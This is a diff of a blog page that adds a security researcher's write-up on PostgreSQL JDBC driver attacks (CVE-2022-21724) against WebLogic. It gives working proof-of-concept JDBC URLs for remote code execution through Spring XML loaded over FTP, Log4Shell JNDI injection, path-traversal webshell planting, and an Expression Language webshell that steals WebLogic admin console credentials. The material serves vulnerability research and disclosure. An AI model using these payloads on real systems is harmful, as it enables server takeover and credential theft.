@@ -6,15 +6,41 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://pynerd.cn">
-  <title>Archives: 2022 | </title>
+  <title>Make JDBC Attacks Brilliant Again | </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title">
-<meta property="og:url" content="http://pynerd.cn/archives/2022/">
+  <meta name="description" content="0x01 BackgroundI made a presentation about JDBC attack interface at HITB security conference in 2021.  The title of this talk is &lt;Make JDBC Attacks Brilliant Again&gt; , if you are interested, the">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Make JDBC Attacks Brilliant Again">
+<meta property="og:url" content="http://pynerd.cn/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/">
 <meta property="og:site_name">
+<meta property="og:description" content="0x01 BackgroundI made a presentation about JDBC attack interface at HITB security conference in 2021.  The title of this talk is &lt;Make JDBC Attacks Brilliant Again&gt; , if you are interested, the">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-108.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-109.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-110.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-111.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-112.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-113.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-114.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-115.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-116.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-117.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-118.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-119.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-121.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-122.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-123.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-124.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-125.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-126.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-127.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-128.png">
+<meta property="og:image" content="http://pynerd.cn/images/pasted-129.png">
+<meta property="article:published_time" content="2022-06-02T02:57:25.000Z">
+<meta property="article:modified_time" content="2022-06-02T10:45:51.339Z">
 <meta property="article:author" content="pyn3rd">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://pynerd.cn/images/pasted-108.png">
   
     <link rel="alternative" href="/atom.xml" title="" type="application/atom+xml">
   
@@ -132,52 +158,215 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-Make-JDBC-Attacks-Brilliant-Again" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/" class="archive-article-date">
-  	<time datetime="2022-06-02T02:57:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-02</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/">Make JDBC Attacks Brilliant Again</a>
+    <h1 class="article-title" itemprop="name">
+      Make JDBC Attacks Brilliant Again
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href="/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/" class="archive-article-date">
+  	<time datetime="2022-06-02T02:57:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h5 id="0x01-Background"><a href="#0x01-Background" class="headerlink" title="0x01 Background"></a>0x01 Background</h5><p>I made a presentation about JDBC attack interface at HITB security conference in 2021. </p>
+<p>The title of this talk is <code>&lt;Make JDBC Attacks Brilliant Again&gt;</code> , if you are interested, the slide link is as follow</p>
+<p><a target="_blank" rel="noopener" href="https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf">https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf</a></p>
+<p>However PostgreSQL database was not included in that presentation, and recently JDBC attacks in PostgreSQL database is mentioned. So I make a capsule write-up , I consider it is the exta chapter of <code>&lt;Make JDBC Attacks Brilliant Again&gt;</code>.</p>
+<h5 id="0x02-PostgreSQL-JDBC-Driver-Remote-Code-Execution（CVE-2022-21724）"><a href="#0x02-PostgreSQL-JDBC-Driver-Remote-Code-Execution（CVE-2022-21724）" class="headerlink" title="0x02 PostgreSQL JDBC Driver Remote Code Execution（CVE-2022-21724）"></a>0x02 PostgreSQL JDBC Driver Remote Code Execution（CVE-2022-21724）</h5><p>Just like other JDBC drivers, PostgreSQL JDBC driver is on supportive of many properties. Let me start with the pair of properties in <code>CVE-2022-21724</code></p>
+<p><strong>a. socketFactory / socketFactoryArg</strong></p>
+<p>Official Document Introduction</p>
+<p><img src="/images/pasted-108.png" alt="upload successful"></p>
+<p>As always, debug and figure out the internal function calling procedure, here, my PostgreSQL driver version is 42.3.1, I write the following code in order to print version.</p>
+<pre><code>System.out.println(&quot;PostgreSQL Driver Version: &quot; + org.postgresql.Driver.class.getPackage().getImplementationVersion());
+</code></pre>
+<p>Set the property empty and execute the code, it throws exceptions.</p>
+<p><img src="/images/pasted-109.png" alt="upload successful"></p>
+<p>Refer to the exceptions, set tne breakpoint at <code>getSocketFactory()</code></p>
+<p><img src="/images/pasted-110.png" alt="upload successful"></p>
+<p>Then step into <code>ObjectFactory.instantiate()</code></p>
+<p><img src="/images/pasted-111.png" alt="upload successful"></p>
+<p>According to this, we figure out <code>socketFactory</code> is used to initialize objects and there is only one string type argument of the constructor.</p>
+<p>Therefore we only need to look for an eligible class, it reminds me of the couple of classes as follow </p>
+<ul>
+<li><p>org.springframework.context.support.ClassPathXmlApplicationContext</p>
+</li>
+<li><p>org.springframework.context.support.FileSystemXmlApplicationContext</p>
+</li>
+</ul>
+<p>We can load the following XML file by one of the above classes</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+    &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
+       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+       xsi:schemaLocation=&quot;
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;
+        &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;
+            &lt;constructor-arg &gt;
+            &lt;list&gt;
+                &lt;value&gt;open&lt;/value&gt;
+                &lt;value&gt;-a&lt;/value&gt;
+                &lt;value&gt;calculator&lt;/value&gt;
+            &lt;/list&gt;
+            &lt;/constructor-arg&gt;
+        &lt;/bean&gt;
+    &lt;/beans&gt;
+</code></pre>
+<p>Start a FTP server</p>
+<p><code>python3 -m pyftpdlib -d .</code></p>
+<p>Check the result</p>
+<p><img src="/images/pasted-112.png" alt="upload successful"></p>
+<p>Maybe it also reminds someone of another class, like  <code>java.io.FileOutputStream</code>. Utilize the class and <code>../../</code> to archive traveral path and empty an file arbitrarily. In my illustation, I create an empty file named <code>test.log</code>.</p>
+<p><img src="/images/pasted-113.png" alt="upload successful"></p>
+<p>b. sslFactory / sslFactoryArg</p>
+<p>Official Document Introduction</p>
+<p><img src="/images/pasted-114.png" alt="upload successful"></p>
+<p>Actually, they are as similar as <code>socketFactory/socketFactoryArg</code>, only a little differencs, the couple of properties are utilized to judge whether it is an encrypted connection with a SSL handshake.<br>About SSL handshake judgement, we can figure out if the recieved request starting with big letter <code>S</code> after establishing connection, it is on supportive of SSL protocol.</p>
+<p>Then step into <code>SSLSocketFactory()</code></p>
+<p><img src="/images/pasted-115.png" alt="upload successful"></p>
+<p>Next step, focus on <code>SSLSocketFactory</code></p>
+<p><img src="/images/pasted-116.png" alt="upload successful"></p>
+<p><img src="/images/pasted-117.png" alt="upload successful"></p>
+<p>From here on, the code logic is the same as before.To avoid repetition, it’s not described in this article.Consequently we only give a response with big letter <code>S</code> after establishing connection, it will be trigged successfully.</p>
+<p><img src="/images/pasted-118.png" alt="upload successful"></p>
+<p>c. Weblogic Server Remote Code Execution</p>
+<p>I mentioned this class <code>org.springframework.context.support.FileSystemXmlApplicationContext </code> in the above illustration.But in Weblogic Server, there is a similar class <code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code></p>
+<p>Pay attention to check these two jar files as follow</p>
+<p><img src="/images/pasted-119.png" alt="upload successful"></p>
+<p>They are both necessary, fortunately built-in by default.</p>
+<p>Finnally construct the PoC</p>
+<pre><code>jdbc:postgresql://127.0.0.1:5432/testdb?&amp;socketFactory=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&amp;socketFactoryArg=ftp://127.0.0.1:2121/bean.xml
+</code></pre>
+<p>Check the result</p>
+<p><img src="/images/pasted-121.png" alt="upload successful"></p>
+<p>0x02 PostgreSQL JDBC Driver arbitrary file write</p>
+<p>a. loggerLevel / loggerFile</p>
+<p>Official Document Instroduction</p>
+<p><img src="/images/pasted-122.png" alt="upload successful"></p>
+<p>So PoC can be contructed like this</p>
+<p><code>jdbc:postgresql://localhost:5432/testdb?loggerLevel=TRACE&amp;loggerFile=pgjdbc.log </code></p>
+<p>b. Log4Shell Logger Injection</p>
+<p>Apparently even though the database connection is failed, all the logs will be written into the specific log file. In order to pollute the log file, we can insert <code>Log4Shell</code> payload into JDBC connection URL.</p>
+<pre><code>jdbc:postgresql://localhost:5432/$&#123;jndi:ldap://127.0.0.1:1389/eajmgl&#125;?loggerLevel=TRACE&amp;loggerFile=pgjdbc.log
+</code></pre>
+<p><img src="/images/pasted-123.png" alt="upload successful"></p>
+<p>When using Apache Log4j2 library to read polluted log file, RCE will be triggered. </p>
+<p><img src="/images/pasted-124.png" alt="upload successful"></p>
+<p>c. Weblogic Server Concise Webshell</p>
+<p>In order to check the result easily, I use another property <code>ApplicationName</code>. Honestly it’s not necessary.</p>
+<p><img src="/images/pasted-125.png" alt="upload successful"></p>
+<p>Try to create a Webshell with a line of concise JSP code. The target directory is<code>../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/</code></p>
+<p>The preliminary payload like this </p>
+<pre><code>jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=&lt;%Runtime.getRuntime().exec(&quot;open -a calculator&quot;)&#125;;%&gt;&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/she11.jsp
+</code></pre>
+<p>Unfortunately it throws exceptions directly, Weblogic Server will decode <code>%Ru</code> (<code>%</code> and the next two characters <code>Ru</code>) with  <code>URLDecoder()</code> method,the exception is as follow</p>
+<pre><code>Could not establish a connection because of java.lang.IllegalArgumentException: URLDecoder: Illegal hex characters in escape (%) pattern - For input string: &quot;Ru&quot;&lt;br/&gt;
+</code></pre>
+<p><img src="/images/pasted-126.png" alt="upload successful"></p>
+<p>Suddenly Expression Language comes to my mind, it can replace JSP to avoid decoding <code>%</code> exceptionally.By the way, Servlet &lt;=2.3 is not supportive of Expression Language by default.It’s necessary to make sure the Weblogic Server built-in Servlet version. In my illustration, Weblogic Server14 with its built-in Servlet 4.0. Servlet &gt; 2.3  is supportive of Expression Language by default.</p>
+<p><img src="/images/pasted-127.png" alt="upload successful"></p>
+<p>Everything is ready. The final PoC like this</p>
+<pre><code>jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=$&#123;Runtime.getRuntime().exec(&quot;open -a calculator&quot;)&#125;&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/calc.jsp
+</code></pre>
+<p>Access Webshell URL, then the calculator pops up.</p>
+<p><img src="/images/pasted-128.png" alt="upload successful"></p>
+<p>d. Weblogic Server Console Password Stealing Webshell</p>
+<p>In the above illustration, I replace JSP with Expression Language successfully, but Expression Language is limited, for example, value cannot be assigned to a variable.</p>
+<p>As we know,the Expression Language defines a set of implicit objects,like  <code>pageContext</code>, it’s pretty useful.</p>
+<p>When instantiating the class <code>javax.servlet.jsp.PageContext</code>, we create an object <code>pageContext</code>, it represnets the entire JSP page. </p>
+<p>Set attribute with <code>pageContext.setAttribute()</code> method and get attribute with <code>pageContext.getAttribute()</code>. If the page scope is not appointed，the order will be  <code>page → request → session → application</code>. Page scope is the default, and the <code>pageContext</code> object belongs to page scope.</p>
+<p>If you know about the above acknowledge, using Java reflection can achieve the desired effect. So the final PoC like this</p>
+<pre><code>jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=$&#123;pageContext.setAttribute(&quot;classLoader&quot;,Thread.currentThread().getContextClassLoader());pageContext.setAttribute(&quot;httpDataTransferHandler&quot;,pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.deploy.service.datatransferhandlers.HttpDataTransferHandler&quot;));pageContext.setAttribute(&quot;managementService&quot;, pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.management.provider.ManagementService&quot;));pageContext.setAttribute(&quot;authenticatedSubject&quot;,pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.security.acl.internal.AuthenticatedSubject&quot;));pageContext.setAttribute(&quot;propertyService&quot;,pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.management.provider.PropertyService&quot;));pageContext.setAttribute(&quot;KERNE_ID&quot;,pageContext.getAttribute(&quot;httpDataTransferHandler&quot;).getDeclaredField(&quot;KERNE_ID&quot;));pageContext.getAttribute(&quot;KERNE_ID&quot;).setAccessible(true);pageContext.setAttribute(&quot;getPropertyService&quot;,managementService.getMethod(&quot;getPropertyService&quot;,pageContext.getAttribute(&quot;authenticatedSubject&quot;)));pageContext.getAttribute(&quot;getPropertyService&quot;).setAccessible(true);pageContext.setAttribute(&quot;prop&quot;,pageContext.getAttribute(&quot;getPropertyService&quot;).invoke(null,pageContext.getAttribute(&quot;KERNE_ID&quot;).get((null))));pageContext.setAttribute(&quot;getTimestamp1&quot;,propertyService.getMethod(&quot;getTimestamp1&quot;));pageContext.getAttribute(&quot;getTimestamp1&quot;).setAccessible(true);pageContext.setAttribute(&quot;getTimestamp2&quot;,propertyService.getMethod(&quot;getTimestamp2&quot;));pageContext.getAttribute(&quot;getTimestamp2&quot;).setAccessible(true);pageContext.setAttribute(&quot;username&quot;, pageContext.getAttribute(&quot;getTimestamp1&quot;).invoke(pageContext.getAttribute(&quot;prop&quot;)));pageContext.setAttribute(&quot;password&quot;,pageContext.getAttribute(&quot;getTimestamp2&quot;).invoke(pageContext.getAttribute(&quot;prop&quot;)));pageContext.getAttribute(&quot;username&quot;).concat(&quot;/&quot;).concat(pageContext.getAttribute(&quot;password&quot;))&#125;&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/passwd.jsp
+</code></pre>
+<p>At last, access the Webshell which we create. Steal the username and password successfully, they are log-in credentials of Weblogic Server administration console.</p>
+<p><img src="/images/pasted-129.png" alt="upload successful"></p>
+<h5 id="0x03-Closing-Words"><a href="#0x03-Closing-Words" class="headerlink" title="0x03 Closing Words"></a>0x03 Closing Words</h5><p>JDBC is widely used because of the Java language.So the attack interface of JDBC makes a great impact.Ecpecially when cloud computing platform is widely used, JDBC connection URL becomes controllable easily.Another key scenarios, authorization bypass weakness are often in Java framewroks.</p>
+<p>I summarize my research as a write-up and hope someone insterested with the attack interface will follow my research and keep on making JDBC attacks brilliant again!</p>
 
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>thanks<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Arbitrary File Upload Tricks In Java </div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/2022/page/2/">2</a><a class="page-number" href="/archives/2022/page/3/">3</a><a class="extend next" rel="next" href="/archives/2022/page/2/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
   
 
 
@@ -201,8 +390,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
